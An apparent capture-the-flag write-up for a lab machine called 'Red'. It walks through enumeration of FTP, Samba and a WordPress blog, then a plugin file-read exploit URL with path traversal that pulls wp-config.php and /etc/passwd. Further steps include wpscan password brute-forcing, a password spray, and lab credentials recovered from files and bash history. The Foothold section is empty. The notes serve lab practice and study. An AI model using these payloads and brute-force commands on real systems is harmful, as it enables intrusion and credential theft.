# Enumeration 


21/tcp           vsFTPd 3.0.3                                                                     
22/tcp
53/tcp   open   tcpwrapped  syn-ack
80/tcp   open   http        syn-ack      PHP cli server 5.5 or later
139/tcp  open   netbios-ssn syn-ack      Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   tcpwrapped  syn-ack doom?
3306/tcp open   mysql       syn-ack      MySQL 5.7.12-0ubuntu1
12380/tcp open   unknown
123/tcp   closed ntp
137/tcp   closed netbios-ns



## Ftp

![[Pasted image 20230105145119.png]]


Anonymous login success 

![[Pasted image 20230105145208.png]]

## Samba

NetBIOS computer name: RED\x00



![[Pasted image 20230105145915.png]]


```
enum4linux -a $ip

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```

## DNS port 53
None

## Port 666 Doom

random chars when connecting 
![[Pasted image 20230105152748.png]]
![[Pasted image 20230105152756.png]]
![[Pasted image 20230105152805.png]]
![[Pasted image 20230105152856.png]]

## port 12380

![[Pasted image 20230105151650.png]]


```
nikto -h http://192.168.170.148:12380

+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2023-01-05 08:30:26 (GMT-5)

Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)

```

### blogblog



![[Pasted image 20230105154024.png]]

Looking at source code it's wordpress

```
wpscan --url https://192.168.170.148:12380/blogblog/ -e u --disable-tls-checks

John Smith
john
barry
elly
peter
heather
garry
harry
scott
kathy
tim


```

content of wp-content is visible so we can enumurate plugins

![[Pasted image 20230105163522.png]]

![[Pasted image 20230105163541.png]]
![[Pasted image 20230105163602.png]]
reading the code found that the exploit will read a file on the system and put it inside of a jpg 
```
# POC -
http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]


https://192.168.98.148/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
```

checking /wp-content/uploads

![[Pasted image 20230105164955.png]]

```
curl -k https://192.168.98.148:12380/blogblog/wp-content/uploads/1653418375.jpeg -o wp-config.php 
```
![[Pasted image 20230105165152.png]]

going back to earlier finding /phpmyadmin

## phpmyadmin

root:plbkac
![[Pasted image 20230105165240.png]]

![[Pasted image 20230105165349.png]]

john has ID 1 which probably means he is admin let's change his password easier than cracking it or we don't need to cos wpscan finished bruteforcing and found valid creds 

```
[SUCCESS] - john / incorrect
```
running same exploit again to grap /etc/passwd to check users on the system
```
https://192.168.98.148/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../../../../etc/passwd
```
doing password spray on the target using the all passwords and users we found earlier 
running password spray 
![[Pasted image 20230105170113.png]]


# Exploitation 


brute forcing wordpress using usernames we got

```
wpscan --url https://192.168.170.148:12380/blogblog/  --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
[SUCCESS] - john / incorrect
[SUCCESS] - kathy / coolgirl                                                                                                                     
[SUCCESS] - garry / football                                                                                                                     
[SUCCESS] - harry / monkey                                                                                                                       
[SUCCESS] - scott / cookie 
```













# Foothold 















# Privesc 

```
ls -laR to list all users directories 
```
found some users that has .bash_history not directing to null
inside JKanode

![[Pasted image 20230105170727.png]]
![[Pasted image 20230105170816.png]]
peter:JZQuyIN5
![[Pasted image 20230105170843.png]]
![[Pasted image 20230105170856.png]]

eee26f145361bebca7a0033f58b9a6cf
# Conclusion
- anonymous login enabled on ftp and samba lead to information disclosure 
- using outdated wordpress lead to exploit and information disclosure to reverse shell
- wordpress was vulnerable to bruteforce
- ssh was vulnerable for password spray 
- user having sudo privileges  on everything 


---
Tags: #ctf #wordpress #hydra 
Resources: [Proving Grounds](https://portal.offensive-security.com/labs/play) 